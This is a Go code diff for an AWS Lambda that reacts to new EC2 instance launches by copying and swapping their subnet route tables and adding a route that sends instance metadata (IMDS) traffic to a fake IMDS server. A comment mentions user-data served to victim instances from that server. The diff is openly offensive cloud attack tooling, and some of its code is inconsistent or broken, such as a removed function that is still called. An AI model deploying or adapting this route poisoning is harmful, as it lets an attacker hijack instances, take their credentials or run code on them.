@@ -2,11 +2,7 @@ package main
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
-	"os"
-	"strings"
-
 	"github.com/aws/aws-lambda-go/events"
 	"github.com/aws/aws-lambda-go/lambda"
 	"github.com/aws/aws-sdk-go-v2/aws"
@@ -17,24 +13,13 @@ import (
 
 var (
 	client             *ec2.Client
-	FakeImdsInstanceId string
-	ActiveVpc          string
-	ActiveSubnets      []string
+	FakeImdsInstanceId = GetRequiredEnv("FakeImdsInstanceId")
 )
 
-func getRequiredEnv(name string) string {
-	if v := os.Getenv(name); v == "" {
-		panic(fmt.Errorf("required environment variable '%s' not found", name))
-	} else {
-		return v
-	}
-}
+const (
+	OrigRouteTableId   = "OrigRouteTableId"
+)
 
-func setupEnv() {
-	FakeImdsInstanceId = getRequiredEnv("FakeImdsInstanceId")
-	ActiveVpc = getRequiredEnv("ActiveVpcs")
-	ActiveSubnets = strings.Split(getRequiredEnv("ActiveSubnets"), ",")
-}
 
 
 func handleRequest(ctx context.Context, event events.CloudWatchEvent) {
@@ -47,74 +32,140 @@ func handleRequest(ctx context.Context, event events.CloudWatchEvent) {
 
 	runEvent := UnMarshallEvent(event)
 
-	var instances []ResponseInstanceItems
-	for _, instance := range runEvent.ResponseElements.InstancesSet.Items {
-		if instance.InstanceState.Name == "pending" {
-			instances = append(instances, instance)
+	// Just take the first for now
+	instance := runEvent.ResponseElements.InstancesSet.Items[0]
+
+	if instance.SubnetId == *GetSubnetFromInstance(ctx, FakeImdsInstanceId).SubnetId {
+		fmt.Printf("[INFO] skipping %s has because it's in the same subnet as the fake imds server", instance.InstanceId)
+		return
+	}
+	PoisonRoutes(ctx, instance)
+}
+
+func PoisonRoutes(ctx context.Context, instance ResponseInstanceItems) {
+	imdsSubnet := GetSubnetFromInstance(ctx, FakeImdsInstanceId)
+	if CopyTableToSubnet(ctx, *imdsSubnet.SubnetId, *imdsSubnet.VpcId) == nil {
+		fmt.Printf("[WARN] another process is in session, exiting to avoid mangling everything")
+		return
+	}
+
+	var newInstanceTable *types.RouteTable
+	if newInstanceTable = CopyTableToSubnet(ctx, instance.SubnetId, *imdsSubnet.VpcId); newInstanceTable == nil {
+		fmt.Printf("[WARN] another process is in session, exiting to avoid mangling everything")
+		return
+	}
+	AddFakeRoute(ctx, newInstanceTable)
+}
+
+func CopyTableToSubnet(ctx context.Context, subnetId, vpcId string) *types.RouteTable {
+	// If a route table association exists we need to replace it rather then add it
+	oldImdsTable := GetSubnetTable(ctx, subnetId)
+	if oldImdsTable == nil {
+		oldImdsTable = GetVpcFromSubnet(ctx, vpcId)
+	}
+
+	for _, tag := range oldImdsTable.Tags {
+		if *tag.Key == OrigRouteTableId {
+			return nil
 		}
 	}
 
-	toUpdate := ToUpdateSearch(instances)
-
-	for vpc, subnet := range toUpdate {
-		AttachFakeImdsRouting(ctx, vpc, subnet)
+	// Note: NewImdsRouteTable adds a tag of the old table that is used to revert later. In the case that we
+	// end up with the vpc route table it will just become a explicit association when we revert. Reverting
+	// isn't done in this code base but in the user-data served to the client.
+	newImdsTable := NewImdsRouteTable(ctx, oldImdsTable)
+	if association := GetAssociationId(oldImdsTable, subnetId); association == nil {
+		AttachTable(ctx, newImdsTable, subnetId)
+	} else {
+		SwapTables(ctx, association.RouteTableAssociationId, newImdsTable)
 	}
 
-	fmt.Printf("runEvent: %s\n", marshal)
+	return newImdsTable
 }
 
-func ToUpdateSearch(instances []ResponseInstanceItems) map[string]string {
-	toUpdate := map[string]string{}
-	for _, instance := range instances {
-		if instance.VpcId != ActiveVpc {
-			continue
-		}
-
-		active := false
-		for _, activeSubnet := range ActiveSubnets {
-			if instance.SubnetId == activeSubnet {
-				active = true
-			}
-		}
-		if !active {
-			continue
-		}
-
-		if subnet, ok := toUpdate[instance.VpcId]; ok && instance.SubnetId == subnet {
-			continue
-		} else {
-			toUpdate[instance.VpcId] = subnet
-		}
-	}
-	return toUpdate
-}
-
-func AttachFakeImdsRouting(ctx context.Context, vpc string, subnet string) {
-	oldTable := GetRouteTable(ctx, vpc, subnet)
-	
-	newTable := CopyRoutes(ctx, oldTable)
-	CopyTags(ctx, oldTable, newTable)
-	AddMetaTags(ctx, oldTable, newTable)
-	AddFakeRoute(ctx, newTable)
-
-	AttachTable(newTable)
-
-}
-
-func AddMetaTags(ctx context.Context, origTable *types.RouteTable, tmpTable *types.RouteTable) {
-	client.CreateTags(ctx, &ec2.CreateTagsInput{
-		Resources: []*string{dst.RouteTableId},
-		Tags: []*types.Tag{
+func GetVpcFromSubnet(ctx context.Context, vpcId string) *types.RouteTable {
+	tables, err := client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
+		Filters: []*types.Filter{
 			{
-				Key: aws.String("RouteTableId"),
-				Value: origTable.RouteTableId,
+				Name:   aws.String("vpc-id"),
+				Values: []*string{aws.String(vpcId)},
 			},
 			{
-				Key:   nil,
-				Value: origTable.,
+				Name:   aws.String("association.main"),
+				Values: []*string{aws.String("true")},
 			},
 		},
 	})
+	if err != nil {
+		panic(err)
+	}
+
+	if tables := tables.RouteTables; len(tables) != 1 {
+		panic(fmt.Errorf("expected one table but got %d: %v", len(tables), tables))
+	} else {
+		return tables[0]
+	}
+}
+
+func NewImdsRouteTable(ctx context.Context, oldImdsTable *types.RouteTable) *types.RouteTable {
+	newImdsTable := CopyRoutes(ctx, oldImdsTable)
+	CopyTags(ctx, oldImdsTable, newImdsTable)
+	AddMetaTags(ctx, oldImdsTable, newImdsTable)
+	return newImdsTable
+}
+
+func GetSubnetFromInstance(ctx context.Context, instanceId string) (subnet *types.Subnet){
+	var subnetId string
+	if instances, err := client.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
+		InstanceIds: []*string{&instanceId},
+	}); err != nil {
+		panic(err)
+	} else {
+		subnetId = *instances.Reservations[0].Instances[0].SubnetId
+	}
+
+	if subnets, err := client.DescribeSubnets(ctx, &ec2.DescribeSubnetsInput{
+		SubnetIds: []*string{aws.String(subnetId)},
+	}); err != nil {
+		panic(nil)
+	} else {
+		subnet = subnets.Subnets[0]
+	}
+
+	return subnet
+}
+
+func AttachTable(ctx context.Context, table *types.RouteTable, subnetId string) {
+	_, err := client.AssociateRouteTable(ctx, &ec2.AssociateRouteTableInput{
+		RouteTableId: table.RouteTableId,
+		SubnetId:     aws.String(subnetId),
+	}); if err != nil {
+		panic(err)
+	}
+}
+
+func SwapTables(ctx context.Context, associationId *string, table *types.RouteTable) {
+	_, err := client.ReplaceRouteTableAssociation(ctx, &ec2.ReplaceRouteTableAssociationInput{
+		RouteTableId: table.RouteTableId,
+		AssociationId: associationId,
+	}); if err != nil {
+		panic(err)
+	}
+}
+
+// AddMetaTags allows us to switch back to the original table later
+func AddMetaTags(ctx context.Context, origTable *types.RouteTable, tmpTable *types.RouteTable) {
+	if _, err := client.CreateTags(ctx, &ec2.CreateTagsInput{
+		Resources: []*string{tmpTable.RouteTableId},
+		Tags: []*types.Tag{
+			{
+				Key:   aws.String(OrigRouteTableId),
+				Value: origTable.RouteTableId,
+			},
+		},
+	}); err != nil {
+		panic(err)
+	}
 }
 	
 func CopyTags(ctx context.Context, src, dst *types.RouteTable) {
@@ -150,10 +201,6 @@ func CopyTags(ctx context.Context, src, dst *types.RouteTable) {
 	}
 }
 
-func AttachTable(oldTable, newTable *types.RouteTable) {
-
-}
-
 func AddFakeRoute(ctx context.Context, table *types.RouteTable) *types.RouteTable {
 	if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
 		RouteTableId:         table.RouteTableId,
@@ -176,8 +223,14 @@ func CopyRoutes(ctx context.Context, table *types.RouteTable) *types.RouteTable 
 	}
 
 	for _, route := range table.Routes {
+
+		if route.GatewayId != nil && *route.GatewayId == "local" {
+			continue
+		}
+
 		if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
 			RouteTableId:                newTable.RouteTable.RouteTableId,
+			CarrierGatewayId:            route.CarrierGatewayId,
 			DestinationCidrBlock:        route.DestinationCidrBlock,
 			DestinationIpv6CidrBlock:    route.DestinationIpv6CidrBlock,
 			DestinationPrefixListId:     route.DestinationPrefixListId,
@@ -197,12 +250,12 @@ func CopyRoutes(ctx context.Context, table *types.RouteTable) *types.RouteTable 
 	return newTable.RouteTable
 }
 
-		func GetRouteTable(ctx context.Context, vpc string, subnet string) *types.RouteTable {
+func GetSubnetTable(ctx context.Context, subnetId string) *types.RouteTable {
 	tables, err := client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
 		Filters: []*types.Filter{
 			{
 				Name:   aws.String("association.subnet-id"),
-				Values: []*string{aws.String(subnet)},
+				Values: []*string{aws.String(subnetId)},
 			},
 		},
 	})
@@ -210,41 +263,11 @@ func CopyRoutes(ctx context.Context, table *types.RouteTable) *types.RouteTable 
 		panic(err)
 	}
 
-	var table *types.RouteTable
 	if l := len(tables.RouteTables); l != 1 {
-		panic(fmt.Errorf("expected a single table associated with %s, but found %s. tables: %v", subnet, l, tables.RouteTables))
+		return nil
 	} else {
-		table = tables.RouteTables[0]
+		return tables.RouteTables[0]
 	}
-
-	if *table.VpcId != vpc {
-		panic(fmt.Errorf("expected subnet %s to be in vpc %s, but instead found vpc %s", subnet, vpc, table.VpcId))
-	}
-
-	return table
-}
-
-func CreateFakeImdsRoutTable(ctx context.Context, vpc string) *ec2.CreateRouteTableOutput {
-	if table, err := client.CreateRouteTable(ctx, &ec2.CreateRouteTableInput{
-		VpcId: aws.String(vpc),
-	}); err != nil {
-		panic(err)
-	} else {
-		return table
-	}
-}
-
-func UnMarshallEvent(event events.CloudWatchEvent) (RunInstancesEvent) {
-	m, err := event.Detail.MarshalJSON()
-	if err != nil {
-		panic(err)
-	}
-
-	var runEvent RunInstancesEvent
-	if err := json.Unmarshal(m, &runEvent); err != nil {
-		panic(err)
-	}
-	return runEvent
 }
 
 func main() {
